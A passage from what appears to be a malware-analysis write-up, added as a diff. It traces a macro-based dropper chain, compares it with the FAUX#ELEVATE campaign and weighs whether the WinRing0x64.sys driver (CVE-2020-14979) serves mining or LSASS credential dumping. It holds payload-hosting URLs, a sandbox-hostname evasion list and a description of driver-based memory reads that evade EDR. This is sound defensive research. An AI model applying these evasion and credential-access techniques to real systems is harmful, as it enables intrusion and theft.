+    <text x="531" y="88" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">Target of BOTH</text>
+    <text x="531" y="100" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.8">persistence mechanisms</text>
+    <text x="531" y="118" textAnchor="middle" fill="currentColor" fontSize="7.5" fontStyle="italic" opacity="0.65">investigation's current</text>
+    <text x="531" y="130" textAnchor="middle" fill="currentColor" fontSize="7.5" fontStyle="italic" opacity="0.65">center of gravity</text>
+  </svg>
+</div>
+
+Separately, the macro also downloads a fourth, undocumented artifact directly, fetching `https://qmlab1.com/assets/img/katyusha2` and dropping it into the temp directory under the sample's own internal naming, `katyusha.exe` and `katyusha_V`/`v32.dll`. That naming is the sample's own, recovered directly from its string table, not an external attribution; it does not match the public, unrelated 2018 ransomware family that also uses the name "Katyusha," and no capability analysis has been performed on this specific artifact yet, it is logged here purely as an observed, unanalyzed component fetched from separate infrastructure than the Dropbox-hosted archive.
+
+## A Related, Not Identical, Public Campaign: FAUX#ELEVATE
+
+Securonix published a detailed report in March 2026 on a campaign they named <Term concept="geofencing-malware">FAUX#ELEVATE</Term>: fake-résumé VBScript lures against French-speaking enterprises, a domain-join gate, a two-stage Dropbox-hosted toolkit (`gmail2.7z` for data theft and mining, `gmail_ma.7z` for persistence and cleanup, both under the same `1625093` archive password), a Monero miner, Chromium App-Bound Encryption bypass tooling, and mail.ru-based exfiltration. That is close enough to this capture, in enough specific, low-entropy details, to be worth laying out side by side rather than treating as a coincidence, while being explicit that this is correlation to a related toolkit, not a claim that the two captures are the same intrusion.
+
+What matches, specifically:
+
+- The archive filename, `gmail2.7z`, and its password, `1625093`, are identical.
+- The binary naming convention overlaps directly: `RuntimeHost.exe` appears in both; Securonix's `mservice.exe` and this capture's `mservice_L.exe` share the same root name with a differing suffix.
+- `WinRing0x64.sys` is present in both, and here the match is exact rather than approximate: this capture's driver hashes to `11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5`, the identical SHA-256 Securonix published for the same filename in their own IOC list. Since this is a legitimate, redistributable third-party driver rather than custom-built malware, an identical hash mostly confirms both operators pulled the same public file rather than proving a shared build pipeline, but it is still the cleanest point of overlap between the two captures.
+- The initial-stage gating logic matches in kind, if not in exact values: a WMI domain-join check, a hardcoded sandbox-hostname blocklist, and self-deletion on a mismatch, the same three-part structure Securonix describes for their VBScript dropper.
+- ESET's own detection engine independently clusters `ms.exe` and `RuntimeHost.exe`, the two payloads from this capture with VirusTotal records, under the same `Agent.AIKJ` family suffix, a signal from a vendor's classification model rather than anything in this investigation's own methodology, pointing the same direction as the shared archive password and driver hash.
+
+What diverges, specifically:
+
+- `RuntimeHost.exe` does not match. Securonix's copy hashes to `853d8001c173520a7f459be73ac6bb7f0363db3beb7632f0a6059fb88b288b6a`; this capture's copy hashes to `da7346fd679cf3242903c380e4380b22e53278f1476e859a78ca3d7a97100df6`. Same filename, same general capability profile (anti-sandbox, networking, crypto), different build.
+- Securonix's report describes `mservice.exe` directly as the Monero miner, launched with mining configuration pulled from a compromised Moroccan WordPress site. This capture's `mservice_L.exe` is a PureBasic GUI/tray application with a `requireAdministrator` manifest, not obviously a miner binary by import table alone, and is the explicit target of both persistence mechanisms here. Whether `mservice_L.exe` in this capture plays the launcher role for a miner it hasn't dropped yet, or is a distinct component in a related but differently-structured build, is unresolved.
+- Second-archive, credential-theft, and exfiltration infrastructure described by Securonix (`gmail_ma.7z`, the ChromElevator-based ABE-bypass tooling, `mozilla.vbs`, `walls.vbs`, mail.ru SMTP exfiltration to specific sender and recipient addresses) has no counterpart identified in this capture so far. That may mean this capture represents an earlier or leaner stage of the same toolkit, a different operator reusing shared components, or simply that those pieces exist in this chain too and haven't been located yet.
+
+The practical read: this is very likely the same underlying loader toolkit, used by the same or a closely related operator, rather than two unrelated authors independently landing on an identical archive name, an identical archive password, and the identical driver file by chance. It is not evidence that this specific capture's `mservice_L.exe` is confirmed to be a cryptominer, that conclusion belongs to the Securonix sample, not this one, until this capture's own binary is traced.
+
+## The Open Question: WinRing0x64.sys, Two Real Hypotheses
+
+The same staged folder containing the three payloads also contains `WinRing0x64.sys`, a driver with a well-documented vulnerability: <Term concept="byovd">CVE-2020-14979</Term>, a NULL-DACL device object in WinRing0 (as bundled with EVGA Precision X1 versions through 1.0.6) that lets any local process, including a low-integrity one, map `\Device\PhysicalMemory` and read or write arbitrary physical memory, which is sufficient for a local privilege escalation to `NT AUTHORITY\SYSTEM`. WinRing0 is genuinely dual-use at the driver level, the same binary exposes both MSR (Model-Specific Register) read/write IOCTLs and arbitrary physical-memory read/write IOCTLs, so the driver's presence alone does not favor one explanation over the other. Which one applies here comes down to which IOCTL code whichever responsible binary actually issues, and that hasn't been traced yet, which makes this a genuine fork between two concrete hypotheses rather than one confirmed answer with an unconfirmed loader.
+
+**Hypothesis A: mining performance tuning.** This is the explanation Securonix documents for the byte-identical driver file in the related FAUX#ELEVATE toolkit, loaded to expose MSRs so a Monero miner can tune RandomX performance, a pattern well-documented in XMRig-derived miners and unrelated to CVE-2020-14979's actual vulnerability. Given the identical driver hash, this transfers as plausible corroboration, but it leans on an assumption this capture doesn't actually support well: Securonix's sample has a confirmed miner binary, `mservice.exe`, described directly as the Monero cryptominer. This capture has no binary that presents that way. `mservice_L.exe` here is a PureBasic GUI/tray application, not an obvious miner by import table, and no mining-pool, Stratum-protocol, or XMRig-pattern strings have turned up in any of the three payloads so far.
+
+**Hypothesis B: credential-access privilege escalation, the vulnerability CVE-2020-14979 actually describes.** A physical-memory read primitive is a real, documented technique specifically for dumping LSASS and other protected process memory without ever calling `OpenProcess` against it, which is exactly the call EDR products hook hardest. Reading credential material through a vulnerable driver's memory-mapping primitive instead sidesteps that entire detection surface. This hypothesis fits this capture's own evidence noticeably better than Hypothesis A does: `ms.exe`'s VirusTotal labels skew heavily toward spyware and password-stealing (`Trojan-Spy.Win32.Agent`, `BScope.TrojanPSW.Stealer`, `Trojan[PSW]/Win32.Convagent`, a verdict that literally contains the word "stealer"), not toward coin-mining, and `RuntimeHost.exe`'s credential-adjacent API surface noted earlier (`GetUserNameW`, `QueryCredentialAttributes`) points the same direction. If this build of the toolkit is oriented around credential theft rather than mining, a driver that lets it read protected memory without an EDR-visible `OpenProcess` call is a far more coherent fit than CPU tuning for a miner that doesn't appear to exist in this capture.
+
+Both hypotheses are real, neither is confirmed, and they aren't mutually exclusive, since a well-resourced related toolkit using the same driver for mining in one build and credential access in another is entirely plausible for the same underlying builder. Resolving it for this specific capture requires finding, in whichever binary is responsible, the pattern of `CreateFileW` against a device path (`\\.\WinRing0_1_2_0` is the driver's documented symbolic link name) followed by `DeviceIoControl`, or, if the driver is being installed as a service first, a `CreateServiceW`/`StartServiceW`/`OpenSCManagerW` sequence that precedes it, and then reading the specific IOCTL code passed, MSR read/write points toward Hypothesis A, physical-memory read/write toward Hypothesis B.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 140" style={{ width: "100%", maxWidth: "580px" }} role="img" aria-label="A diagram showing all three payloads as candidate callers into the WinRing0x64.sys vulnerable driver, with a question mark on each arrow, since which specific binary loads and communicates with the driver has not yet been established." >
+    <rect x="30" y="15" width="120" height="36" rx="6" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.1" />
+    <text x="90" y="37" textAnchor="middle" fill="currentColor" fontSize="9" fontFamily="monospace">ms.exe</text>
+    <rect x="260" y="15" width="150" height="36" rx="6" fill="#f59e0b" fillOpacity="0.1" stroke="#f59e0b" strokeWidth="1.1" />
+    <text x="335" y="37" textAnchor="middle" fill="currentColor" fontSize="9" fontFamily="monospace">RuntimeHost.exe</text>
+    <rect x="490" y="15" width="150" height="36" rx="6" fill="#0ea5e9" fillOpacity="0.1" stroke="#0ea5e9" strokeWidth="1.1" />
+    <text x="565" y="37" textAnchor="middle" fill="currentColor" fontSize="9" fontFamily="monospace">mservice_L.exe</text>
+    <rect x="240" y="90" width="190" height="40" rx="7" fill="currentColor" fillOpacity="0.08" stroke="currentColor" strokeWidth="1.2" strokeDasharray="4 3" />
+    <text x="335" y="110" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold" fontFamily="monospace">WinRing0x64.sys</text>
+    <text x="335" y="123" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.7">CVE-2020-14979</text>
+    <line x1="90" y1="51" x2="300" y2="90" stroke="currentColor" strokeOpacity="0.4" strokeWidth="1" strokeDasharray="3 3" />
+    <text x="150" y="72" fill="currentColor" fontSize="11" opacity="0.6">?</text>
+    <line x1="335" y1="51" x2="335" y2="90" stroke="currentColor" strokeOpacity="0.4" strokeWidth="1" strokeDasharray="3 3" />
+    <text x="342" y="72" fill="currentColor" fontSize="11" opacity="0.6">?</text>
+    <line x1="565" y1="51" x2="380" y2="90" stroke="currentColor" strokeOpacity="0.4" strokeWidth="1" strokeDasharray="3 3" />
+    <text x="500" y="72" fill="currentColor" fontSize="11" opacity="0.6">?</text>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>A byte-identical driver file is documented elsewhere as MSR-based mining tuning, but this capture's own payloads carry stealer-leaning VirusTotal labels and no identified miner binary, which makes the CVE's actual privilege-escalation path at least as plausible here. Neither is confirmed.</p>
+</div>
+
+## Indicators of Compromise
+
+| Type | Value | Context |
+|---|---|---|
+| URL | `hxxps://www[.]dropbox[.]com/scl/fi/1k7ednk2dz21bvjy1i057/gmail2.7z` | Hosts the password-protected second-stage archive |
+| URL | `hxxps://qmlab1[.]com/assets/img/katyusha2` | Hosts an unanalyzed fourth artifact, locally named katyusha.exe/v32.dll |
+| URL | `hxxp://ip-api[.]com/csv/?fields=countryCode` | Legitimate service abused for geofencing; the request itself, in this script's exact form, is the signal |
+| Archive password | `1625093` | Identical to the password Securonix documents for FAUX#ELEVATE's gmail2.7z/gmail_ma.7z |
+| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Media Service` | Run-key persistence pointing at mservice_L.exe |
+| Scheduled task | `MicrosoftUpdateService` | 10-minute recurring task, HighestAvailable, launches mservice_l.exe |
+| File path | `%PUBLIC%\WindowsUpdate\{ms.exe, RuntimeHost.exe, mservice_L.exe, st.xml}` | Staging directory for all four extracted artifacts |
+| SHA-256 | `0018f7065bfb601038faefb870bbdadf7b1a37734b31895f9ba9e0de6e7a0ff0` | ms.exe; 51/70 on VirusTotal, spyware/stealer-leaning labels, recorded calling the same ip-api.com geofencing endpoint as the VBA macro |
+| SHA-256 | `da7346fd679cf3242903c380e4380b22e53278f1476e859a78ca3d7a97100df6` | RuntimeHost.exe; 24/69 on VirusTotal, no consensus family, dropped file v32.dll recorded at detonation, does not match the RuntimeHost.exe hash in the related Securonix report |
+| SHA-256 | `11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5` | WinRing0x64.sys; identical to the hash Securonix published for FAUX#ELEVATE |
+| Dropped file | `v32.dll` | Recorded by VirusTotal's sandbox detonation of RuntimeHost.exe; matches the \v32.dll string already present in this investigation's own VBA string table |
+| Dropped file | `taskkill.exe` (legitimate) | Recorded by VirusTotal's sandbox detonation of ms.exe; consistent with the TerminateProcess capability in its import table |
+| IP | `5.139.44.126`, `5.139.44.127` (AS12389, Rostelecom, RU) | Outbound contact recorded during VirusTotal's detonation of RuntimeHost.exe; relationship to C2 not established |
+| Hostname blocklist | `JOHN-PC`, `LDWVFKWJ`, `NCCZNUNV`, `DESKTOP-D019GDM`, `JRIWWBPD`, `ZLYTWMBI`, `ONUGVJVT`, `DESKTOP-U05E4LC`, `DESKTOP-29MF6G4` | Sandbox-evasion exact-match list in the first-stage macro, nine entries across two naming styles |
+
+## MITRE ATT&CK Mapping
+
+The table below has the evidence; the diagram is the same mapping laid out by tactic, in roughly the order the chain actually executes. Amber chips are the two techniques still genuinely in question, resting on the Hypothesis A/B fork from the previous section rather than confirmed behavior in this capture.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 800 190" style={{ width: "100%", maxWidth: "760px" }} role="img" aria-label="A MITRE ATT&CK tactic-flow diagram with eight columns in execution order: Initial Access (Phishing, T1566), Defense Evasion (Obfuscated Files T1027, Software Packing T1027.002, Sandbox Evasion T1497.001), Discovery (System Location Discovery T1614), Command and Control (Ingress Tool Transfer T1105), Persistence (Registry Run Keys T1547.001, Scheduled Task T1053.005), Privilege Escalation (Process Injection T1055, Exploitation for Privilege Escalation / BYOVD T1068), Credential Access (OS Credential Dumping T1003, a hypothesis resting on the WinRing0 driver), and Impact (Resource Hijacking T1496, the competing hypothesis for the same driver). The two hypothesis techniques are visually distinguished as unconfirmed.">
+    <defs>
+      <marker id="adMitreArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.4" />
+      </marker>
+    </defs>
+    <line x1="10" y1="26" x2="790" y2="26" stroke="currentColor" strokeOpacity="0.25" strokeWidth="1" markerEnd="url(#adMitreArrow)" />
+
+    <text x="55" y="10" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">INITIAL</text>
+    <text x="55" y="19" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">ACCESS</text>
+    <rect x="10" y="34" width="90" height="30" rx="5" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.1" />
+    <text x="55" y="51" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Phishing</text>
+    <text x="55" y="61" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1566</text>
+
+    <text x="155" y="10" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">DEFENSE</text>
+    <text x="155" y="19" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">EVASION</text>
+    <rect x="110" y="34" width="90" height="30" rx="5" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.1" />
+    <text x="155" y="51" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Obfuscated Files</text>
+    <text x="155" y="61" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1027</text>
+    <rect x="110" y="68" width="90" height="30" rx="5" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.1" />
+    <text x="155" y="85" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Software Packing</text>
+    <text x="155" y="95" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1027.002</text>
+    <rect x="110" y="102" width="90" height="34" rx="5" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.1" />
+    <text x="155" y="116" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Sandbox Evasion:</text>
+    <text x="155" y="126" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">System Checks</text>
+    <text x="155" y="133" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1497.001</text>
+
+    <text x="245" y="14" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">DISCOVERY</text>
+    <rect x="210" y="34" width="80" height="34" rx="5" fill="#f59e0b" fillOpacity="0.12" stroke="#f59e0b" strokeWidth="1.1" />
+    <text x="250" y="48" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">System Location</text>
+    <text x="250" y="58" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Discovery</text>
+    <text x="250" y="65" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1614</text>
+
+    <text x="345" y="10" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">COMMAND &amp;</text>
+    <text x="345" y="19" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">CONTROL</text>
+    <rect x="300" y="34" width="90" height="30" rx="5" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.1" />
+    <text x="345" y="51" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Ingress Tool Transfer</text>
+    <text x="345" y="61" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1105</text>
+
+    <text x="445" y="14" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">PERSISTENCE</text>
+    <rect x="400" y="34" width="90" height="30" rx="5" fill="#10b981" fillOpacity="0.12" stroke="#10b981" strokeWidth="1.1" />
+    <text x="445" y="51" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Registry Run Keys</text>
+    <text x="445" y="61" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1547.001</text>
+    <rect x="400" y="68" width="90" height="30" rx="5" fill="#10b981" fillOpacity="0.12" stroke="#10b981" strokeWidth="1.1" />
+    <text x="445" y="85" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Scheduled Task</text>
+    <text x="445" y="95" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1053.005</text>
+
+    <text x="545" y="10" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">PRIVILEGE</text>
+    <text x="545" y="19" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">ESCALATION</text>
+    <rect x="500" y="34" width="90" height="30" rx="5" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="545" y="51" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Process Injection</text>
+    <text x="545" y="61" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1055</text>
+    <rect x="500" y="68" width="90" height="34" rx="5" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="545" y="82" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Exploitation for</text>
+    <text x="545" y="92" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Priv Esc / BYOVD</text>
+    <text x="545" y="99" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1068</text>
+
+    <text x="645" y="10" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">CREDENTIAL</text>
+    <text x="645" y="19" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">ACCESS</text>
+    <rect x="600" y="34" width="90" height="42" rx="5" fill="#f59e0b" fillOpacity="0.18" stroke="#f59e0b" strokeWidth="1.3" strokeDasharray="4 3" />
+    <text x="645" y="48" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">OS Credential</text>
+    <text x="645" y="58" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Dumping</text>
+    <text x="645" y="65" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1003</text>
+    <text x="645" y="73" textAnchor="middle" fill="currentColor" fontSize="6.5" fontStyle="italic" opacity="0.65">Hypothesis B</text>
+
+    <text x="745" y="14" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold" opacity="0.75">IMPACT</text>
+    <rect x="700" y="34" width="90" height="42" rx="5" fill="#f59e0b" fillOpacity="0.18" stroke="#f59e0b" strokeWidth="1.3" strokeDasharray="4 3" />
+    <text x="745" y="48" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Resource</text>
+    <text x="745" y="58" textAnchor="middle" fill="currentColor" fontSize="7.5" fontWeight="bold">Hijacking</text>
+    <text x="745" y="65" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.7">T1496</text>
+    <text x="745" y="73" textAnchor="middle" fill="currentColor" fontSize="6.5" fontStyle="italic" opacity="0.65">Hypothesis A</text>
+
+    <path d="M590 89 Q 596 72 600 59" fill="none" stroke="#f59e0b" strokeOpacity="0.6" strokeWidth="1.1" strokeDasharray="3 3" markerEnd="url(#adMitreArrow)" />
+    <path d="M590 89 Q 650 70 700 59" fill="none" stroke="#f59e0b" strokeOpacity="0.6" strokeWidth="1.1" strokeDasharray="3 3" markerEnd="url(#adMitreArrow)" />
+    <text x="400" y="185" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.6">Credential Access and Impact both fork off the same unresolved WinRing0x64.sys IOCTL call, not two separate findings.</text>
+  </svg>
+</div>
+
+| Technique | ID | Evidence |
+|---|---|---|
+| Phishing / Malicious Document | T1566 | VBA macro as initial vector |
+| Obfuscated Files or Information | T1027 | Nonsense-variable-name string obfuscation plus junk-comment padding in the macro |
+| Virtualization/Sandbox Evasion: System Checks | T1497.001 | Nine-entry hardcoded sandbox hostname list; named Sandboxie/Cuckoo/VBox/VMware artifacts in RuntimeHost.exe; detect-debug-environment tag on both payload VirusTotal records |
+| System Location Discovery | T1614 | ip-api.com geolocation check gating execution on country code, independently confirmed re-run by ms.exe itself at detonation |
+| Ingress Tool Transfer | T1105 | Dropbox-hosted archive, qmlab1.com-hosted secondary artifact, legitimate 7zr.exe download |
+| Obfuscated Files or Information: Software Packing | T1027.002 | UPX packing on all three second-stage binaries |
+| Registry Run Keys / Startup Folder | T1547.001 | Microsoft Media Service Run key |
+| Scheduled Task | T1053.005 | MicrosoftUpdateService, 10-minute interval |
+| Process Injection | T1055 | OpenProcess/VirtualAllocEx/WriteProcessMemory sequence in ms.exe (capability; use unconfirmed); spyware/stealer-leaning labels from 51/70 VirusTotal vendors |
+| OS Credential Dumping | T1003 | Hypothesis B for WinRing0x64.sys: physical-memory read as an LSASS-dumping primitive that avoids an OpenProcess call; not yet confirmed via DeviceIoControl tracing, but consistent with ms.exe's stealer-leaning VirusTotal labels |
+| Exploitation for Privilege Escalation / BYOVD | T1068 | WinRing0x64.sys, CVE-2020-14979, byte-identical hash to a related sample; two competing, unconfirmed hypotheses for its role in this capture (see below) |
+| Resource Hijacking | T1496 | Hypothesis A for WinRing0x64.sys: MSR-based mining tuning, the role documented for the identical driver file in the related FAUX#ELEVATE report; no miner binary identified in this capture specifically |
+
+## Conclusion
+
+The headline finding of this investigation isn't any single technique, it's how early and how cheaply the anti-analysis logic runs, and how much a password and a driver hash can establish without ever claiming more than they actually prove. Sandbox and geography checks that happen in a VBA macro, before any packed binary touches disk, and then get independently re-run by one of the payloads itself at execution, are nearly free for the operator and expensive for a defender to work around. The correlation to FAUX#ELEVATE is the same discipline applied one level up: an identical archive name, an identical archive password, and a byte-identical driver file are strong enough evidence to call this the same toolkit, while a differing RuntimeHost.exe hash and an unconfirmed role for mservice_L.exe are reason enough not to call it the same intrusion, and reason enough to question rather than inherit the related sample's own conclusion about what that identical driver is actually for here. The capability-versus-behavior distinction carried through every payload section held up under new evidence rather than needing to be walked back: VirusTotal's own detonations corroborated the sandbox-detection and geofencing findings independently, surfaced two things pure static analysis hadn't (`RuntimeHost.exe` dropping `v32.dll` and `ms.exe` calling out to the operator's own geolocation endpoint), and tilted the WinRing0x64.sys question itself: a related sample's own report says mining, but this capture's own vendor labels say stealer, and a physical-memory read primitive is exactly the kind of EDR-blind credential-access tool a stealer would want. That fork, mining tuning versus LSASS access via a driver, not which binary happens to load the driver, is the real open question this investigation ends on.
+
+## References & Further Reading
+
+1. NVD, "CVE-2020-14979 Detail." [https://nvd.nist.gov/vuln/detail/cve-2020-14979](https://nvd.nist.gov/vuln/detail/cve-2020-14979)
+	The authoritative record for the WinRing0 NULL-DACL physical memory read/write vulnerability referenced throughout the BYOVD section.
+2. timsonner, winring0-research. [https://github.com/timsonner/winring0-research](https://github.com/timsonner/winring0-research)
+	Public research and tooling documenting WinRing0 exploitation across its several CVEs, including the device symbolic link name referenced above.
+3. MITRE ATT&CK, "Virtualization/Sandbox Evasion: System Checks," T1497.001. [https://attack.mitre.org/techniques/T1497/001/](https://attack.mitre.org/techniques/T1497/001/)
+	The classification behind the sandbox hostname list and the named VM/sandbox artifacts in RuntimeHost.exe.
+4. MITRE ATT&CK, "System Location Discovery," T1614. [https://attack.mitre.org/techniques/T1614/](https://attack.mitre.org/techniques/T1614/)
+	The classification behind the ip-api.com geofencing check.
+5. MITRE ATT&CK, "Process Injection," T1055. [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/)
+	The classification behind ms.exe's OpenProcess/VirtualAllocEx/WriteProcessMemory capability, explicitly noted above as unconfirmed in actual use.
+6. 7-Zip, official download page. [https://www.7-zip.org/download.html](https://www.7-zip.org/download.html)
+	The legitimate distribution source for 7zr.exe, downloaded directly by the macro rather than bundled.
+7. Sangwan, Gaikwad, Beardslee (Securonix Threat Research), "Analyzing FAUX#ELEVATE: Threat Actors Target France with CV Lures to Deploy Crypto Miners and Infostealers Targeting Enterprise Environments" (2026). [https://www.securonix.com/blog/faux-elevate-threat-actors-crypto-miners-and-infostealers/](https://www.securonix.com/blog/faux-elevate-threat-actors-crypto-miners-and-infostealers/)
+	The primary source for the correlation section: the gmail2.7z/gmail_ma.7z archive names and shared password, the WinRing0x64.sys hash and its MSR-based mining role, and the RuntimeHost.exe and mservice.exe hashes compared against this capture's own.
+8. The Hacker News, "Hackers Use Fake Resumes to Steal Enterprise Credentials and Deploy Crypto Miner" (March 24, 2026). [https://thehackernews.com/2026/03/hackers-use-fake-resumes-to-steal.html](https://thehackernews.com/2026/03/hackers-use-fake-resumes-to-steal.html)
+	Independent secondary coverage of the Securonix report, used to confirm publication date and that no specific threat actor is named.
+9. MITRE ATT&CK, "Resource Hijacking," T1496. [https://attack.mitre.org/techniques/T1496/](https://attack.mitre.org/techniques/T1496/)
+	The classification for the mining capability documented in the related FAUX#ELEVATE report, not independently confirmed in this capture.
